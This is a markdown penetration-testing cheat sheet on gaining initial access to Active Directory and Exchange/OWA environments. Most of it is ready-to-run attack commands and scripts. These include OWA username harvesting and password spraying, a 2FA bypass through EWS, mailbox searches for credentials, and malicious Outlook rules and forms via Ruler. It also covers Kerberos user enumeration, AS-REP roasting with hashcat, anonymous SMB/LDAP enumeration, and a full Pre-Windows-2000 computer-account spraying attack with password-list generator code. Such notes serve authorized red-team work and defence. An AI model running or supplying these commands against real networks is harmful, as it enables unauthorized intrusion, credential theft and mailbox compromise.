# Initial Access attacks
* [From the outside](#From-the-outside)
  * [Web Attacks](#Web-Attacks)  
  * [Password Attacks](#Password-Attacks)
    * [Exchange & OWA](#Exchange-&-OWA)
* [From the inside](#From-the-inside)
  * [Web Attacks](#Web-Attacks2) 
  * [Password Attacks](#Password-Attacks2)
    * [Enumerate users](#Enumerate-users)
    * [AS-REP Roasting](#AS-REP-Roasting)
    * [Exchange & OWA](#Exchange-&-OWA2)
  * [Relaying Attacks](#Relaying-Attacks)
  * [Anonymous Access](#Anonymous-Access)
    * [SMB](#SMB)
    * [LDAP](#LDAP)
  * [Pre Windows 2000 Computers](#Pre-Windows-2000-Computers)

# From the outside
## Web Attacks
- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.

## Password Attacks
### Exchange & OWA
- Attack path could be: Reconnaissance --> OWA Discovery --> Internal Domain Discovery --> Naming scheme fuzzing --> Username enumeration --> Password discovery --> GAL Extraction --> More Password discovery --> 2fa bypass --> Remote Access through VPN/RDP / Malicious Outlook Rules or Forms / Internal Phishing

#### Collection of data (OSINT)
- Collect e-mail adresses, usernames, passwords, get the email/user account naming scheme with tools such as:
  - https://github.com/mschwager/fierce
  - https://www.elevenpaths.com/innovation-labs/technologies/foca
  - https://github.com/lanmaster53/recon-ng
  - https://github.com/leebaird/discover
  - https://github.com/laramies/theHarvester

#### Domain name discovery
- https://github.com/dafthack/MailSniper
```
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME>
Invoke-DomainHarvestOwa -ExchHostname <EXCH HOSTNAME> -OutFile <POTENTIAL_DOMAINS.TXT> -CompanyName "TARGET NAME"
```
- Internal Domain name may be found inside a SSL Certificate

#### Name scheme fuzzing
- Create a username list from the OSINT
- Could use https://github.com/dafthack/EmailAddressMangler to generate mangled username list
```
Invoke-EmailAddressMangler -FirstNamesList <TXT> -LastNameList <TXT> -AddresConvention fnln | Out-File -Encoding ascii possible-usernames.txt
```

- https://gist.github.com/superkojiman/11076951
```
/opt/namemash.py names.txt >> possible-usernames.txt
```

#### Username Enumeration
- https://github.com/dafthack/MailSniper
```
Invoke-UsernameHarvestOWA -Userlist possible-usernames.txt -ExchHostname <EXCH HOSTNAME> -DOMAIN <IDENTIFIED INTERNAL DOMAIN NAME> -OutFile domain_users.txt
```

#### Password discovery
- https://github.com/dafthack/MailSniper
- https://github.com/byt3bl33d3r/SprayingToolkit
- OPSEC: Passwordspraying with a lot of attempts and quickly is LOUD and may count towards domain lockout policy!
```
Invoke-PasswordSprayOWA -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname <EXCH HOSTNAME> -Userlist domain_users.txt -Password <PASSWORD> -Threads 15 -Outfile ews-sprayed-creds.txt
```

#### Global Address List (GAL) Extraction
- https://els-cdn.content-api.ine.com/09f3f35f-6f69-4a9d-90be-d13046e692c0/index.html#
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```
- Then you could spray passwords again to get access to more mail accounts!

#### Bypassing 2fa
- Can check by server responses if supplied password is correct or not.
- Most 2FA vendors do not cover all available Exchange protocols. Owa might be protected but EWS might not be!

```
# Access through EWS
Invoke-SelfSearch -Mailbox <MAIL ADDRESS> -ExchHostname <DOMAIN NAME> -remote
```

#### Spreading the compromise
- Pillaging mailboxes for credentials/sensitive data
  -  https://github.com/milo2012/owaDump (--keyword option)
  -  https://github.com/dafthack/MailSniper (Invoke-SelfSearch)
  -  https://github.com/xorrior/EmailRaider (Invoke-MailSearch)
- Internal phishing
  - Mail from internal email adresses to targets.
- Malicious Outlook rules
  - Two interested options: Start application and run a script (Start application is synced through Exchange server, run a script is not)
  - Since Outlook 2016 both options are disabled by default
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange Service Access (via RPC or MAPI over HTTP)
    - Malicious file dropped on disk (Through WebDAV share using UNC or local SMB share when physically inside) 
  - The attack:
    - Create a malicious executable (EXE, HTA, BAT, LNK etc.) and host it on an open WebDAV share
    - Create a malicious Outlook rule using the rulz.py script, pointing the file path to your WebDAV share
      - https://gist.github.com/monoxgas/7fec9ec0f3ab405773fc
    - Run a local Outlook instance using the target's credentials and import the malicious rule you created (File --> Manager Rules & Alerts --> Options --> Improt rules)
    - Send the trigger email. 
- Malicious Outlook Forms
  - If the path is applied that disables Run Application and Run Script rules this still works!
  - Attack prequisites:
    - Identification of valid credentials
    - Exchange service access 
  - KB4011091 for outlook 2016 seems to block VBSCript in forms
  - https://github.com/sensepost/ruler/wiki/Forms
  - ```.\ruler --email <EMAIL> form add --suffix form_name --input /tmp/command.txt --send```

# From the inside
## Web Attacks2
- It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.

## Password Attacks2
### Enumerate users
- https://github.com/ropnop/kerbrute
```
sudo ./kerbrute userenum -d <domain> domain_users.txt -dc <IP>
```

#### Spray one password against all users
- Use ```--continue-on-success``` too keep going after 1 successful login
```
crackmapexec smb <DC IP> -d <DOMAIN> -u domain_users.txt -p <PASSWORD LIST> | tee passwordspray.txt
```

### AS-REP Roasting
```
python3 GetNPUsers.py <DOMAIN>/ -usersfile domain_users.txt -format hashcat -outputfile AS_REP_hashcat.txt
```

#### Crack hashes with hashcat
```
hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Exchange & OWA
- All the attacks from the outside works from the inside!

#### Enumerate all mailboxes
- https://github.com/dafthack/MailSniper
```
Get-GlobalAddressList -ExchHostname <EXCH HOSTNAME> -UserName <DOMAIN>\<USER> -Password <PASSWORD> -Verbose -OutFile global-address-list.txt
```

#### Check access to mailboxes with current user
- https://github.com/dafthack/MailSniper
```
Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
```

#### Read e-mails
- https://github.com/dafthack/MailSniper
- The below command looks for terms like pass, creds, credentials from top 100 emails
```
Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
```

## Relaying attacks
[Relaying page](relaying.md)

## Anonymous LDAP
### SMB
#### Check for anonymous access
```
cme smb <IP> -u "" -p "" -d <DOMAIN>
cme smb <IP> -u "" -p "" -d .

cme smb <IP> -u "Guest" -p "" -d <DOMAIN>
```

#### List shares
```
cme smb <IP> -u "" -p "" -d <DOMAIN> --shares
cme smb <IP> -u "" -p "" -d . --shares

cme smb <IP> -u "Guest" -p "" -d <DOMAIN> --shares
```

#### Connect to share
```
smbclientsmbclient //<IP>/<SHARE> -U ""%""
```

### LDAP
#### Check for anonymous ldap access
- This is a legacy configuration, and as of Windows Server 2003
```
cme ldap <IP> -u "" -p "" -d <DOMAIN>

cme ldap <IP> -u "Guest" -p "" -d <DOMAIN>
```

#### Run enum4linux
```
enum4linux <IP>
```

#### Windapsearch
- https://github.com/ropnop/windapsearch
```
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --users
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --computers
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --groups
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --da
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --privileged-users
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --user-spns
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --unconstrained-users
python3 windapsearch.py --dc-ip <IP> -u "" -p "" --unconstrained-computers
```

## Pre Windows 2000 Computers
- https://www.thehacker.recipes/ad/movement/domain-settings/pre-windows-2000-computers

### Create lists of computer objects and passwords
- The password is all lowercase, no `$` and max 14 characters.

### Without access to the domain
- Without access to the domain. Scan for hostnames with cme and create a list.
```
cme smb <RANGES> | tee cme_computers.txt

cat cme_computers.txt | awk '{print $4 "$"}'
```

- Save python code below as `CreatePreWindows2000PasswordList.py`
```
import sys
for name in sys.stdin:
	print(name.strip().rstrip('$').lower()[:14])
```

- Create password list
```
cat computers.txt| python3 CreatePreWindows2000PasswordList.py
```

### With access to the domain
- With access to the domain its possible to use the following small PowerShell script to get the list of all computer objects and generate a list for the passwords to password spray. From my domain audit tool.
```
$data = Get-DomainComputer -Credential $Creds -Domain $Domain -DomainController $Server | Select-Object -ExpandProperty samaccountname
$data = $data -replace 'samaccountname', '' -replace '-', ''
	
$file = "$checks_path\list_computers.txt"
$data | Out-File $file
Write-Host "[W] Writing list of computers to $file"
	
$data = $data -replace '\$', ''
	
$file = "$checks_path\list_computers_Pre-Windows2000Computers_pass.txt"
ForEach ($line in $data) {
	if ($line.Length -gt 14) {
			$line.SubString(0,14) | Out-File -Append $File
	}
	else {
			$line | Out-File -Append $File
	}
}
Write-Host "[W] Writing list of passwords to $file"
```

### The attack
#### Spray all computer objects
``` 
cme smb <DC IP> -d <DOMAIN> -u list_computers.txt -p list_computers_Pre-Windows2000Computers_pass.txt --no-bruteforce --continue-on-success | tee spray_pre2000.txt

cat spray_pre2000.txt | grep "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"
```

#### Change computer account password
- https://github.com/fortra/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
```
python3 rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'
```

#### Authenticate with computer account password
```
cme smb <DC IP> -d <DOMAIN> -u <COMPUTER> -p <PASS>
```
